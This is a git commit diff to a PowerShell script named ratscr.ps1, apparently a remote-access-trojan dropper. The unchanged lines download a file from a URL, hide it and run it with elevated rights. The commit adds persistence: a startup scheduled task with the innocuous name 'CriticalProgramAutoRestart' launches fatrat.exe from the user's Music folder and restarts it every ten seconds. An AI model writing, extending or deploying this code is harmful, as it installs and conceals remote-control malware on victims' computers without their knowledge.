3791855a1cbd4a072b84b3448f5aaaba3a62496c
arman <sadoonarman@icloud.com>
2025-11-24 14:33:17 +0330

    Update ratscr.ps1

--- ratscr.ps1
+++ ratscr.ps1
@@ -9,3 +9,38 @@ Invoke-WebRequest -Uri $url -OutFile $dest
 Set-ItemProperty -Path $dest -Name Attributes -Value Hidden
 
 Start-Process -FilePath $dest -Verb RunAs   
+
+
+
+
+$exePath = Join-Path $env:USERPROFILE "Music\fatrat.exe"
+
+$action = New-ScheduledTaskAction -Execute $exePath
+$trigger = New-ScheduledTaskTrigger -AtStartup
+
+$settings = New-ScheduledTaskSettingsSet `
+    -RestartCount 9999 `
+    -RestartInterval (New-TimeSpan -Seconds 10) `
+    -AllowStartOnBatteries `
+    -ExecutionTimeLimit (New-TimeSpan -Hours 24)
+
+Register-ScheduledTask `
+    -TaskName "CriticalProgramAutoRestart" `
+    -Action $action `
+    -Trigger $trigger `
+    -Settings $settings `
+    -Description "Keeps my essential program always running"
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
